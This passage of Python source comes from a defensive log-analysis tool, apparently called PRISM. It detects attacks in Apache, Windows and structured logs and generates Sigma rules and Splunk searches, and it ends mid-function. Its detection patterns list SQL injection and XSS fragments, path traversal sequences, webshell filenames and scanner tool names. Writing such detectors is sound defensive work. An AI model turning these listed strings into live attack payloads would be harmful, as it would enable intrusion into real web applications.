    # ──────────────────────────────────────────────────────────────────
    # APACHE LOG DETECTIONS
    # ──────────────────────────────────────────────────────────────────

    def _analyze_apache(self, entries: list[dict]) -> list[dict]:
        findings = []

        sqli_hits = [e for e in entries if e.get("is_sqli")]
        xss_hits = [e for e in entries if e.get("is_xss")]
        traversal_hits = [e for e in entries if e.get("is_path_traversal")]
        rfi_hits = [e for e in entries if e.get("is_rfi")]
        webshell_hits = [e for e in entries if e.get("is_webshell")]
        scanner_hits = [e for e in entries if e.get("is_scanner")]
        admin_hits = [e for e in entries if e.get("is_admin_access")]
        backup_hits = [e for e in entries if e.get("is_backup_file")]

        # 4xx surge by IP — directory/resource scanning
        ip_4xx = defaultdict(int)
        for e in entries:
            if e.get("is_4xx") and e.get("src_ip"):
                ip_4xx[e["src_ip"]] += 1
        scanner_ips = {ip: cnt for ip, cnt in ip_4xx.items() if cnt >= 20}

        if sqli_hits:
            findings.append({
                "rule_name": "web_sql_injection_attempt",
                "title": "SQL Injection Attempt in HTTP Request",
                "description": "HTTP requests containing SQL injection payloads were detected in URL parameters.",
                "severity": "high",
                "mitre_technique": "T1190 — Exploit Public-Facing Application",
                "hit_count": len(sqli_hits),
                "sample_entry": sqli_hits[0],
                "evidence": {"sample_paths": [e.get("path", "")[:120] for e in sqli_hits[:3]]},
                "keywords": ["union select", "or 1=1", "drop table", "insert into"],
                "log_source": "apache",
            })

        if xss_hits:
            findings.append({
                "rule_name": "web_xss_attempt",
                "title": "Cross-Site Scripting (XSS) Attempt",
                "description": "HTTP requests containing XSS payloads detected in URL or query parameters.",
                "severity": "medium",
                "mitre_technique": "T1059.007 — Command and Scripting Interpreter: JavaScript",
                "hit_count": len(xss_hits),
                "sample_entry": xss_hits[0],
                "evidence": {"sample_paths": [e.get("path", "")[:120] for e in xss_hits[:3]]},
                "keywords": ["<script", "javascript:", "onerror=", "document.cookie"],
                "log_source": "apache",
            })

        if traversal_hits:
            findings.append({
                "rule_name": "web_path_traversal_attempt",
                "title": "Directory Traversal Attempt",
                "description": "Path traversal sequences detected in HTTP request paths, potentially accessing files outside web root.",
                "severity": "high",
                "mitre_technique": "T1083 — File and Directory Discovery",
                "hit_count": len(traversal_hits),
                "sample_entry": traversal_hits[0],
                "evidence": {"sample_paths": [e.get("path", "")[:120] for e in traversal_hits[:3]]},
                "keywords": ["../", "..\\", "%2e%2e"],
                "log_source": "apache",
            })

        if webshell_hits:
            findings.append({
                "rule_name": "web_webshell_access",
                "title": "Webshell Access Detected",
                "description": "HTTP requests targeting known webshell filenames detected. May indicate a compromised server.",
                "severity": "critical",
                "mitre_technique": "T1505.003 — Server Software Component: Web Shell",
                "hit_count": len(webshell_hits),
                "sample_entry": webshell_hits[0],
                "evidence": {"accessed_paths": [e.get("path", "") for e in webshell_hits[:5]]},
                "keywords": ["cmd.php", "shell.php", "c99.php", "r57.php", "webshell"],
                "log_source": "apache",
            })

        if scanner_hits:
            findings.append({
                "rule_name": "web_scanner_detected",
                "title": "Web Security Scanner Detected",
                "description": "Requests from known security scanning tools (Nikto, SQLMap, DirBuster, etc.) detected.",
                "severity": "medium",
                "mitre_technique": "T1595.001 — Active Scanning: Scanning IP Blocks",
                "hit_count": len(scanner_hits),
                "sample_entry": scanner_hits[0],
                "evidence": {"scanner_uas": list({e.get("useragent", "")[:80] for e in scanner_hits[:5]})},
                "keywords": ["nikto", "sqlmap", "dirbuster", "gobuster", "masscan"],
                "log_source": "apache",
            })

        if scanner_ips:
            top_ip = max(scanner_ips, key=lambda k: scanner_ips[k])
            findings.append({
                "rule_name": "web_directory_scanning",
                "title": "Web Directory Enumeration / Scanning",
                "description": "High volume of 404 Not Found responses from a single IP, indicating directory enumeration.",
                "severity": "medium",
                "mitre_technique": "T1595.003 — Active Scanning: Wordlist Scanning",
                "hit_count": sum(scanner_ips.values()),
                "sample_entry": {"src_ip": top_ip},
                "evidence": {"offending_ips": list(scanner_ips.keys())[:5], "threshold": 20},
                "keywords": ["404", "GET"],
                "log_source": "apache",
            })

        return findings

    # ──────────────────────────────────────────────────────────────────
    # WINDOWS EVENT LOG DETECTIONS
    # ──────────────────────────────────────────────────────────────────

    def _analyze_windows(self, entries: list[dict]) -> list[dict]:
        findings = []

        failed_logons = [e for e in entries if e.get("is_failed_logon")]
        service_installs = [e for e in entries if e.get("is_service_install")]
        sched_tasks = [e for e in entries if e.get("is_scheduled_task")]
        account_created = [e for e in entries if e.get("is_account_created")]
        group_modified = [e for e in entries if e.get("is_group_modified")]
        log_cleared = [e for e in entries if e.get("is_log_cleared")]
        kerberoast = [e for e in entries if e.get("is_kerberoast")]
        privileged = [e for e in entries if e.get("is_privileged_logon")]

        # Brute force on Windows (4625)
        if len(failed_logons) >= 5:
            ip_counter = Counter(e.get("src_ip", "unknown") for e in failed_logons)
            findings.append({
                "rule_name": "windows_brute_force_logon",
                "title": "Windows Brute Force Logon Attempts (EventID 4625)",
                "description": "Multiple failed Windows authentication attempts, potentially indicating a brute force or password spray attack.",
                "severity": "high",
                "mitre_technique": "T1110.003 — Brute Force: Password Spraying",
                "hit_count": len(failed_logons),
                "sample_entry": failed_logons[0],
                "evidence": {
                    "total_failures": len(failed_logons),
                    "top_source_ips": dict(ip_counter.most_common(5)),
                },
                "event_ids": [4625],
                "keywords": ["EventID: 4625"],
                "log_source": "windows",
            })

        # Suspicious service install (7045, 4697)
        if service_installs:
            findings.append({
                "rule_name": "windows_suspicious_service_install",
                "title": "Suspicious Windows Service Installation",
                "description": "A new service was installed. Malware and attackers frequently install malicious services for persistence.",
                "severity": "high",
                "mitre_technique": "T1543.003 — Create or Modify System Process: Windows Service",
                "hit_count": len(service_installs),
                "sample_entry": service_installs[0],
                "evidence": {},
                "event_ids": [4697, 7045],
                "keywords": ["EventID: 4697", "EventID: 7045"],
                "log_source": "windows",
            })

        # Scheduled task creation (4698)
        if sched_tasks:
            findings.append({
                "rule_name": "windows_scheduled_task_created",
                "title": "Scheduled Task Created for Persistence",
                "description": "A new scheduled task was created. Commonly used by attackers to maintain persistence.",
                "severity": "medium",
                "mitre_technique": "T1053.005 — Scheduled Task/Job: Scheduled Task",
                "hit_count": len(sched_tasks),
                "sample_entry": sched_tasks[0],
                "evidence": {},
                "event_ids": [4698],
                "keywords": ["EventID: 4698"],
                "log_source": "windows",
            })

        # New local account creation (4720)
        if account_created:
            findings.append({
                "rule_name": "windows_new_account_created",
                "title": "New Local User Account Created",
                "description": "A new local user account was created. Could indicate attacker establishing persistence or privilege escalation.",
                "severity": "medium",
                "mitre_technique": "T1136.001 — Create Account: Local Account",
                "hit_count": len(account_created),
                "sample_entry": account_created[0],
                "evidence": {},
                "event_ids": [4720],
                "keywords": ["EventID: 4720"],
                "log_source": "windows",
            })

        # Group membership modification
        if group_modified:
            findings.append({
                "rule_name": "windows_privileged_group_modification",
                "title": "Security Group Membership Modified",
                "description": "A user was added to a security group. Adding accounts to privileged groups is a common lateral movement technique.",
                "severity": "high",
                "mitre_technique": "T1098 — Account Manipulation",
                "hit_count": len(group_modified),
                "sample_entry": group_modified[0],
                "evidence": {},
                "event_ids": [4728, 4732, 4756],
                "keywords": ["EventID: 4728", "EventID: 4732"],
                "log_source": "windows",
            })

        # Audit log cleared — strong indicator of attacker cover-up
        if log_cleared:
            findings.append({
                "rule_name": "windows_audit_log_cleared",
                "title": "Windows Security Audit Log Cleared",
                "description": "The Windows Security event log was cleared. This is a strong indicator of an attacker attempting to cover their tracks.",
                "severity": "critical",
                "mitre_technique": "T1070.001 — Indicator Removal: Clear Windows Event Logs",
                "hit_count": len(log_cleared),
                "sample_entry": log_cleared[0],
                "evidence": {},
                "event_ids": [1102],
                "keywords": ["EventID: 1102"],
                "log_source": "windows",
            })

        # Kerberoasting (many 4769 for different services)
        if len(kerberoast) >= 3:
            findings.append({
                "rule_name": "windows_kerberoasting_attempt",
                "title": "Potential Kerberoasting Activity (EventID 4769)",
                "description": "High volume of Kerberos service ticket requests. Could indicate Kerberoasting — an offline password attack against service accounts.",
                "severity": "high",
                "mitre_technique": "T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting",
                "hit_count": len(kerberoast),
                "sample_entry": kerberoast[0],
                "evidence": {"ticket_requests": len(kerberoast)},
                "event_ids": [4769],
                "keywords": ["EventID: 4769"],
                "log_source": "windows",
            })

        return findings

    # ──────────────────────────────────────────────────────────────────
    # GENERIC STRUCTURED LOG DETECTIONS (CSV / JSON / XML)
    #
    # These formats don't follow one fixed schema, so detection here works
    # off the canonical fields produced by parsers/common.py::normalize_record
    # (src_ip, username, action, status, status_code, event_id, ...) instead
    # of format-specific regexes. If a structured log happens to carry a
    # Windows-style event_id (e.g. a forwarded/exported event in CSV/JSON/XML),
    # the same EventID heuristics used for native Windows logs are reused.
    # ──────────────────────────────────────────────────────────────────

    def _analyze_generic(self, entries: list[dict]) -> list[dict]:
        findings = []
        log_src = self.log_type

        failed_auth_by_ip = defaultdict(list)
        denied_by_ip = defaultdict(list)
        error_by_ip = defaultdict(list)
        sensitive_actions = []
        admin_actions = []

        for e in entries:
            ip = e.get("src_ip", "")
            if e.get("is_failed_auth") and ip:
                failed_auth_by_ip[ip].append(e)
            if e.get("is_denied") and ip:
                denied_by_ip[ip].append(e)
            if e.get("is_error_status") and ip:
                error_by_ip[ip].append(e)
            if e.get("is_sensitive_action"):
                sensitive_actions.append(e)
            if e.get("is_admin_user") and (e.get("is_sensitive_action") or e.get("is_failed_auth")):
                admin_actions.append(e)

        # Repeated authentication failures from the same source (brute force)
        brute_ips = {ip: evts for ip, evts in failed_auth_by_ip.items() if len(evts) >= 5}
        if brute_ips:
            top_ip = max(brute_ips, key=lambda k: len(brute_ips[k]))
            findings.append({
                "rule_name": "generic_repeated_auth_failures",
                "title": "Repeated Authentication Failures from Single Source",
                "description": "Multiple failed authentication events from the same source within the analyzed log, consistent with a brute force or credential stuffing attempt.",
                "severity": "high",
                "mitre_technique": "T1110 — Brute Force",
                "hit_count": sum(len(v) for v in brute_ips.values()),
                "sample_entry": brute_ips[top_ip][0],
                "evidence": {
                    "offending_sources": list(brute_ips.keys())[:5],
                    "max_attempts": max(len(v) for v in brute_ips.values()),
                    "threshold": 5,
                },
                "keywords": ["fail", "failed", "denied", "unauthorized"],
                "log_source": log_src,
            })

        # High volume of denied/blocked events from one source (scan / block surge)
        block_ips = {ip: evts for ip, evts in denied_by_ip.items() if len(evts) >= 10}
        if block_ips:
            top_ip = max(block_ips, key=lambda k: len(block_ips[k]))
            findings.append({
                "rule_name": "generic_block_deny_surge",
                "title": "High Volume of Denied/Blocked Events from Single Source",
                "description": "A single source generated a large number of denied or blocked events, consistent with port scanning or a blocked attack attempt.",
                "severity": "medium",
                "mitre_technique": "T1595 — Active Scanning",
                "hit_count": sum(len(v) for v in block_ips.values()),
                "sample_entry": block_ips[top_ip][0],
                "evidence": {
                    "offending_sources": list(block_ips.keys())[:5],
                    "max_events": max(len(v) for v in block_ips.values()),
                    "threshold": 10,
                },
                "keywords": ["deny", "denied", "block", "blocked", "drop"],
                "log_source": log_src,
            })

        # Error/4xx-5xx status spikes per source (web/app/api logs)
        error_ips = {ip: evts for ip, evts in error_by_ip.items() if len(evts) >= 20}
        if error_ips:
            top_ip = max(error_ips, key=lambda k: len(error_ips[k]))
            findings.append({
                "rule_name": "generic_error_status_spike",
                "title": "High Volume of Error Responses from Single Source",
                "description": "A single source triggered an unusually high number of error status codes (4xx/5xx), which can indicate scanning, fuzzing, or enumeration.",
                "severity": "medium",
                "mitre_technique": "T1595.002 — Active Scanning: Vulnerability Scanning",
                "hit_count": sum(len(v) for v in error_ips.values()),
                "sample_entry": error_ips[top_ip][0],
                "evidence": {
                    "offending_sources": list(error_ips.keys())[:5],
                    "threshold": 20,
                },
                "keywords": ["status_code"],
                "log_source": log_src,
            })

        # Sensitive/privileged actions (IAM changes, policy edits, etc.)
        if sensitive_actions:
            action_counts = Counter(e.get("action", "unknown") for e in sensitive_actions)
            findings.append({
                "rule_name": "generic_sensitive_action_detected",
                "title": "Sensitive Administrative Action Detected",
                "description": "One or more high-privilege actions (account/IAM/policy changes, console logins, logging changes) were observed and should be reviewed for legitimacy.",
                "severity": "high",
                "mitre_technique": "T1098 — Account Manipulation",
                "hit_count": len(sensitive_actions),
                "sample_entry": sensitive_actions[0],
                "evidence": {"action_counts": dict(action_counts.most_common(10))},
                "keywords": [a for a in action_counts][:10],
                "log_source": log_src,
            })

        # Reuse Windows EventID heuristics for any structured log carrying event_id
        findings.extend(self._analyze_event_ids(entries, log_src))

        return findings

    def _analyze_event_ids(self, entries: list[dict], log_src: str) -> list[dict]:
        """Shared EventID-based heuristics, usable by any log type (native
        Windows text logs, or CSV/JSON/XML exports that carry event_id)."""
        findings = []

        def by_flag(flag):
            return [e for e in entries if e.get(flag)]

        failed_logons = by_flag("is_failed_logon")
        if len(failed_logons) >= 5:
            findings.append({
                "rule_name": f"{log_src}_windows_brute_force_logon",
                "title": "Windows Brute Force Logon Attempts (EventID 4625)",
                "description": "Multiple failed Windows authentication events (EventID 4625) detected.",
                "severity": "high",
                "mitre_technique": "T1110.003 — Brute Force: Password Spraying",
                "hit_count": len(failed_logons),
                "sample_entry": failed_logons[0],
                "evidence": {"total_failures": len(failed_logons)},
                "event_ids": [4625],
                "keywords": ["4625"],
                "log_source": log_src,
            })

        log_cleared = by_flag("is_log_cleared")
        if log_cleared:
            findings.append({
                "rule_name": f"{log_src}_windows_audit_log_cleared",
                "title": "Windows Security Audit Log Cleared",
                "description": "EventID 1102 observed — the Windows Security event log was cleared, a strong indicator of anti-forensic activity.",
                "severity": "critical",
                "mitre_technique": "T1070.001 — Indicator Removal: Clear Windows Event Logs",
                "hit_count": len(log_cleared),
                "sample_entry": log_cleared[0],
                "evidence": {},
                "event_ids": [1102],
                "keywords": ["1102"],
                "log_source": log_src,
            })

        kerberoast = by_flag("is_kerberoast")
        if len(kerberoast) >= 3:
            findings.append({
                "rule_name": f"{log_src}_windows_kerberoasting_attempt",
                "title": "Potential Kerberoasting Activity (EventID 4769)",
                "description": "High volume of Kerberos service ticket requests (EventID 4769), which can indicate Kerberoasting.",
                "severity": "high",
                "mitre_technique": "T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting",
                "hit_count": len(kerberoast),
                "sample_entry": kerberoast[0],
                "evidence": {"ticket_requests": len(kerberoast)},
                "event_ids": [4769],
                "keywords": ["4769"],
                "log_source": log_src,
            })

        service_installs = by_flag("is_service_install")
        if service_installs:
            findings.append({
                "rule_name": f"{log_src}_windows_suspicious_service_install",
                "title": "Suspicious Windows Service Installation",
                "description": "A new service was installed (EventID 4697/7045) — commonly used for persistence.",
                "severity": "high",
                "mitre_technique": "T1543.003 — Create or Modify System Process: Windows Service",
                "hit_count": len(service_installs),
                "sample_entry": service_installs[0],
                "evidence": {},
                "event_ids": [4697, 7045],
                "keywords": ["4697", "7045"],
                "log_source": log_src,
            })

        group_modified = by_flag("is_group_modified")
        if group_modified:
            findings.append({
                "rule_name": f"{log_src}_windows_privileged_group_modification",
                "title": "Security Group Membership Modified",
                "description": "A user was added to a security group (EventID 4728/4732/4756) — a common lateral movement / persistence technique.",
                "severity": "high",
                "mitre_technique": "T1098 — Account Manipulation",
                "hit_count": len(group_modified),
                "sample_entry": group_modified[0],
                "evidence": {},
                "event_ids": [4728, 4732, 4756],
                "keywords": ["4728", "4732", "4756"],
                "log_source": log_src,
            })

        return findings


# ==============================================================================
# SOURCE: generators/sigma_generator.py
# ==============================================================================
"""
SigmaGenerator — produces industry-standard Sigma detection rules (.yml)
Sigma is the portable SIEM rule format, compatible with Splunk, Elastic, QRadar, etc.
"""

LOG_SOURCE_MAP = {
    "auth": {
        "product": "linux",
        "service": "auth",
        "category": "authentication",
    },
    "apache": {
        "product": "apache",
        "service": "apache",
        "category": "webserver",
    },
    "windows": {
        "product": "windows",
        "service": "security",
        "category": "process_creation",
    },
    "csv": {
        "product": "generic",
        "service": "csv_export",
        "category": "application",
    },
    "json": {
        "product": "generic",
        "service": "json_log",
        "category": "application",
    },
    "xml": {
        "product": "generic",
        "service": "xml_log",
        "category": "application",
    },
}


class SigmaGenerator:
    def __init__(self, output_dir: Path):
        self.output_dir = output_dir

    def generate(self, findings: list[dict], log_type: str, source_filename: str) -> list[str]:
        generated = []
        logsource = LOG_SOURCE_MAP.get(log_type, {"product": "generic", "service": "system"})

        for finding in findings:
            rule = self._build_rule(finding, logsource, source_filename)
            filename = f"sigma_{finding['rule_name']}.yml"
            filepath = self.output_dir / filename

            with open(filepath, "w", encoding="utf-8") as f:
                # Write Sigma YAML with proper formatting
                f.write(self._render_sigma_yaml(rule))

            generated.append(str(filepath))

        return generated

    def _build_rule(self, finding: dict, logsource: dict, source_filename: str) -> dict:
        detection = self._build_detection(finding)

        rule = {
            "title": finding["title"],
            "id": str(uuid.uuid4()),
            "status": "experimental",
            "description": finding["description"],
            "references": [
                f"https://attack.mitre.org/techniques/{self._mitre_id(finding)}",
                "https://github.com/SigmaHQ/sigma",
            ],
            "author": "PRISM Auto-Generated",
            "date": date.today().isoformat(),
            "tags": self._build_tags(finding),
            "logsource": logsource,
            "detection": detection,
            "falsepositives": self._false_positives(finding),
            "level": finding["severity"],
        }

        return rule

    def _build_detection(self, finding: dict) -> dict:
        rule_name = finding["rule_name"]
        keywords = finding.get("keywords", [])
        event_ids = finding.get("event_ids", [])
        evidence = finding.get("evidence", {})
        log_source = finding["log_source"]

        selection = {}
        condition = ""

        # SSH / Auth based rules
        if log_source == "auth":
            if keywords:
                selection["keywords"] = keywords
            condition = "keywords"

        # Apache / Web rules
        elif log_source == "apache":
            if keywords:
                selection["cs-uri-query|contains|all"] = keywords[:3] if len(keywords) > 1 else keywords
                selection["cs-uri-query|contains"] = keywords
            condition = "selection"

        # Windows Event Log rules (native text format)
        elif log_source == "windows":
            if event_ids:
                selection["EventID"] = event_ids if len(event_ids) > 1 else event_ids[0]
            condition = "selection"

            # Add threshold conditions for brute force
            if "brute_force" in rule_name or "spray" in rule_name:
                threshold = evidence.get("threshold", 5)
                return {
                    "selection": selection,
                    "condition": f"selection | count() by SourceAddress > {threshold}",
                    "timeframe": "5m",
                }

        # Generic structured logs (CSV / JSON / XML): event_id-based rules
        # (e.g. a Windows event exported as JSON) reuse the same EventID
        # selection logic; everything else selects on field keywords.
        elif log_source in ("csv", "json", "xml", "generic"):
            if event_ids:
                selection["EventID"] = event_ids if len(event_ids) > 1 else event_ids[0]
                condition = "selection"
                if "brute_force" in rule_name:
                    threshold = evidence.get("threshold", 5)
                    return {
                        "selection": selection,
                        "condition": f"selection | count() by src_ip > {threshold}",
                        "timeframe": "5m",
                    }
            elif keywords:
                selection["fields|contains"] = keywords
                condition = "selection"
                if "threshold" in evidence:
                    return {
                        "selection": selection,
                        "condition": f"selection | count() by src_ip > {evidence['threshold']}",
                        "timeframe": "10m",
                    }

        if not selection:
            selection["keywords"] = keywords or [rule_name]
            condition = condition or "selection"

        return {
            "selection": selection,
            "condition": condition,
        }

    def _build_tags(self, finding: dict) -> list[str]:
        tags = ["attack.defense_evasion"]
        mitre = finding.get("mitre_technique", "")
        tid_match = re.search(r"T(\d{4})(?:\.(\d{3}))?", mitre)
        if tid_match:
            tid = f"T{tid_match.group(1)}"
            tags = [f"attack.{tid.lower()}"]
            if tid_match.group(2):
                tags.append(f"attack.{tid.lower()}.{tid_match.group(2)}")
        return tags

    def _mitre_id(self, finding: dict) -> str:
        mitre = finding.get("mitre_technique", "")
        m = re.search(r"(T\d{4}(?:\.\d{3})?)", mitre)
        if m:
            return m.group(1).replace(".", "/")
        return "T1059"

    def _false_positives(self, finding: dict) -> list[str]:
        fps = {
            "ssh_brute_force_by_ip": ["Legitimate automated systems with many auth attempts", "Misconfigured scripts"],
            "ssh_user_enumeration": ["Developers testing SSH connectivity", "Automated deployment tools"],
            "ssh_root_login_attempt": ["Legacy systems requiring root SSH access"],
            "web_sql_injection_attempt": ["Web application security scanners", "Penetration tests"],
            "web_xss_attempt": ["Security testing", "WAF bypass testing in authorized scope"],
            "web_path_traversal_attempt": ["Web application testing", "Vulnerability scanners"],
            "web_webshell_access": ["Development environments with test shells"],
            "web_scanner_detected": ["Authorized penetration testing", "Internal security scans"],
            "windows_brute_force_logon": ["Misconfigured applications with bad credentials", "Helpdesk automation"],
            "windows_audit_log_cleared": ["IT administrators during maintenance (very rare legitimate use)"],
        }
        return fps.get(finding["rule_name"], ["Unknown / Legitimate administrative activity"])

    def _render_sigma_yaml(self, rule: dict) -> str:
        """Render a clean Sigma YAML file with header comment"""
        header = (
            "# ─────────────────────────────────────────────────────────────────────\n"
            f"# PRISM — Auto-Generated Sigma Detection Rule\n"
            f"# Generated: {date.today().isoformat()}\n"
            f"# MITRE ATT&CK compatible | Deploy with sigma-cli\n"
            "# ─────────────────────────────────────────────────────────────────────\n\n"
        )
        # Use yaml.dump with custom settings for readability
        content = yaml.dump(
            rule,
            default_flow_style=False,
            allow_unicode=True,
            sort_keys=False,
            indent=2,
            width=100,
        )
        return header + content


# ==============================================================================
# SOURCE: generators/splunk_generator.py
# ==============================================================================
"""
SplunkGenerator — produces Splunk Search Processing Language (SPL) queries
as .spl files ready to import as saved searches / correlation rules.
"""

class SplunkGenerator:
    def __init__(self, output_dir: Path):
        self.output_dir = output_dir

    def generate(self, findings: list[dict], log_type: str, source_filename: str) -> list[str]:
        generated = []

        for finding in findings:
            spl = self._build_spl(finding, log_type)
            filename = f"splunk_{finding['rule_name']}.spl"
            filepath = self.output_dir / filename

            with open(filepath, "w", encoding="utf-8") as f:
                f.write(spl)

            generated.append(str(filepath))

        return generated

    def _build_spl(self, finding: dict, log_type: str) -> str:
        rule_name = finding["rule_name"]
        title = finding["title"]
        desc = finding["description"]
        severity = finding["severity"]
        mitre = finding.get("mitre_technique", "Unknown")
        evidence = finding.get("evidence", {})
        event_ids = finding.get("event_ids", [])
        keywords = finding.get("keywords", [])

        header = (
            f"| *** PRISM Auto-Generated Splunk Search ***\n"
            f"| *** Rule: {title}\n"
            f"| *** Severity: {severity.upper()}\n"
            f"| *** MITRE: {mitre}\n"
            f"| *** Generated: {date.today().isoformat()}\n\n"
        )

        spl = self._spl_for_rule(rule_name, finding, log_type, event_ids, keywords, evidence)

        # Wrap with standard Splunk notable event / alert boilerplate
        footer = self._splunk_alert_footer(title, severity, mitre, rule_name)

        return header + spl + "\n\n" + footer

    def _spl_for_rule(self, rule_name, finding, log_type, event_ids, keywords, evidence):
        # Auth / SSH rules
        if log_type == "auth":
            if "brute_force" in rule_name and "successful" not in rule_name:
                threshold = evidence.get("threshold", 5)
                return (
                    f'index=os sourcetype=linux_secure\n'
                    f'("Failed password" OR "Failed publickey")\n'
                    f'| rex field=_raw "from (?P<src_ip>\\d{{1,3}}\\.\\d{{1,3}}\\.\\d{{1,3}}\\.\\d{{1,3}})"\n'
                    f'| stats count AS failure_count BY src_ip\n'
                    f'| where failure_count >= {threshold}\n'
                    f'| sort -failure_count\n'
                    f'| rename src_ip AS "Source IP", failure_count AS "Failed Attempts"\n'
                    f'| eval risk_score=if(failure_count>50,"critical",if(failure_count>20,"high","medium"))'
                )

            elif "user_enumeration" in rule_name:
                return (
                    'index=os sourcetype=linux_secure "Invalid user"\n'
                    '| rex field=_raw "Invalid user (?P<invalid_user>\\S+) from (?P<src_ip>\\S+)"\n'
                    '| stats dc(invalid_user) AS distinct_users count BY src_ip\n'
                    '| where distinct_users >= 5\n'
                    '| sort -distinct_users'
                )

            elif "root_login" in rule_name:
                return (
                    'index=os sourcetype=linux_secure\n'
                    '("Failed password for root" OR "Failed password for invalid user root")\n'
                    '| rex field=_raw "from (?P<src_ip>\\S+) port"\n'
                    '| stats count AS attempts BY src_ip\n'
                    '| sort -attempts'
                )

            elif "successful_login_after" in rule_name:
                return (
                    'index=os sourcetype=linux_secure\n'
                    '| rex field=_raw "from (?P<src_ip>\\S+)"\n'
                    '| rex field=_raw "(?P<auth_result>Failed|Accepted) (password|publickey)"\n'
                    '| stats values(auth_result) AS results BY src_ip\n'
                    '| where mvfind(results,"Failed")>=0 AND mvfind(results,"Accepted")>=0\n'
                    '| eval message="Successful login after failures - possible brute force success"'
                )

        # Apache / Web rules
        elif log_type == "apache":
            if "sql_injection" in rule_name:
                return (
                    'index=web sourcetype=access_combined\n'
                    '(cs_uri_query="*union*select*" OR cs_uri_query="*or+1=1*"\n'
                    ' OR cs_uri_query="*drop+table*" OR cs_uri_query="*insert+into*"\n'
                    ' OR cs_uri_query="*\'--*" OR uri_path="*union select*")\n'
                    '| rex field=_raw "(?P<src_ip>\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})"\n'
                    '| stats count BY src_ip, uri_path, _time\n'
                    '| sort -count'
                )

            elif "xss" in rule_name:
                return (
                    'index=web sourcetype=access_combined\n'
                    '(cs_uri_query="*<script*" OR cs_uri_query="*javascript:*"\n'
                    ' OR cs_uri_query="*onerror=*" OR cs_uri_query="*document.cookie*")\n'
                    '| rex field=_raw "(?P<src_ip>\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})"\n'
                    '| stats count BY src_ip, uri_path'
                )

            elif "path_traversal" in rule_name:
                return (
                    'index=web sourcetype=access_combined\n'
                    '(uri_path="*../*" OR uri_path="*..\\\\*" OR uri_path="*%2e%2e%2f*")\n'
                    '| rex field=_raw "(?P<src_ip>\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})"\n'
                    '| stats count BY src_ip, uri_path, status\n'
                    '| where status != 404'
                )

            elif "webshell" in rule_name:
                return (
                    'index=web sourcetype=access_combined\n'
                    '(uri_path="*cmd.php*" OR uri_path="*shell.php*"\n'
                    ' OR uri_path="*c99*" OR uri_path="*r57*" OR uri_path="*webshell*")\n'
                    '| table _time, src_ip, uri_path, status, http_user_agent\n'
                    '| sort -_time'
                )

            elif "scanner" in rule_name and "directory" not in rule_name:
                return (
                    'index=web sourcetype=access_combined\n'
                    '(http_user_agent="*nikto*" OR http_user_agent="*sqlmap*"\n'
                    ' OR http_user_agent="*dirbuster*" OR http_user_agent="*gobuster*"\n'
                    ' OR http_user_agent="*masscan*" OR http_user_agent="*burp*")\n'
                    '| rex field=_raw "(?P<src_ip>\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})"\n'
                    '| stats count BY src_ip, http_user_agent'
                )

            elif "directory_scan" in rule_name:
                return (
                    'index=web sourcetype=access_combined status=404\n'
                    '| rex field=_raw "(?P<src_ip>\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})"\n'
                    '| stats count AS error_count BY src_ip\n'
                    '| where error_count >= 20\n'
                    '| sort -error_count\n'
                    '| eval risk="Possible directory enumeration"'
                )

        # Windows rules
        elif log_type == "windows":
            if event_ids:
                eids_str = " OR ".join(f"EventCode={e}" for e in event_ids)
                base = f'index=wineventlog ({eids_str})\n'

                if "brute_force" in rule_name:
                    return (
                        base +
                        '| rex field=Message "Source Network Address:\\s+(?P<src_ip>\\S+)"\n'
                        '| rex field=Message "Account Name:\\s+(?P<username>\\S+)"\n'
                        '| stats count AS failures BY src_ip, username\n'
                        '| where failures >= 5\n'
                        '| sort -failures'
                    )
                elif "log_cleared" in rule_name:
                    return base + '| table _time, host, user, Message\n| sort -_time'
                elif "kerberoast" in rule_name:
                    return (
                        base +
                        '| rex field=Message "Account Name:\\s+(?P<username>\\S+)"\n'
                        '| rex field=Message "Service Name:\\s+(?P<service>\\S+)"\n'
                        '| stats dc(service) AS service_count BY username\n'
                        '| where service_count >= 3\n'
                        '| eval alert="Possible Kerberoasting"'
                    )
                else:
                    return base + '| table _time, host, user, EventCode, Message\n| sort -_time'

        # Generic structured logs (CSV / JSON / XML)
        elif log_type in ("csv", "json", "xml", "generic"):
            sourcetype = {"csv": "csv_log", "json": "json_log", "xml": "xml_log"}.get(log_type, "generic_log")
            base = f'index=* sourcetype={sourcetype}\n'

            if event_ids:
                eids_str = " OR ".join(f"EventID={e}" for e in event_ids)
                base = f'index=* sourcetype={sourcetype} ({eids_str})\n'
                if "brute_force" in rule_name:
                    return (
                        base +
                        '| stats count AS failures BY src_ip\n'
                        f'| where failures >= {evidence.get("threshold", 5)}\n'
                        '| sort -failures'
                    )
                return base + '| table _time, host, src_ip, username, event_id, message\n| sort -_time'

            if "repeated_auth_failures" in rule_name:
                threshold = evidence.get("threshold", 5)
                return (
                    base +
                    'is_failed_auth=true\n'
                    '| stats count AS failures BY src_ip\n'
                    f'| where failures >= {threshold}\n'
                    '| sort -failures'
                )
            elif "block_deny_surge" in rule_name:
                threshold = evidence.get("threshold", 10)
                return (
                    base +
                    'is_denied=true\n'
                    '| stats count AS denied_events BY src_ip\n'
                    f'| where denied_events >= {threshold}\n'
                    '| sort -denied_events'
                )
            elif "error_status_spike" in rule_name:
                threshold = evidence.get("threshold", 20)
                return (
                    base +
                    'is_error_status=true\n'
                    '| stats count AS errors BY src_ip\n'
                    f'| where errors >= {threshold}\n'
                    '| sort -errors'
                )
            elif "sensitive_action" in rule_name:
                return (
                    base +
                    'is_sensitive_action=true\n'
                    '| table _time, host, username, action, src_ip\n'
                    '| sort -_time'
                )
            else:
                return base + '| table _time, host, src_ip, username, action, message\n| sort -_time'

        return f'index=* "{rule_name}"\n| table _time, host, user, _raw\n| sort -_time'

    def _splunk_alert_footer(self, title, severity, mitre, rule_name):
        severity_map = {"low": 1, "medium": 3, "high": 7, "critical": 10}
        risk_score = severity_map.get(severity, 5)

        return (
            f"| *** === Alert Configuration ===\n"
            f"| *** Alert Name     : PRISM - {title}\n"
            f"| *** Cron Schedule  : */15 * * * *  (every 15 minutes)\n"
            f"| *** Severity       : {severity.upper()}\n"
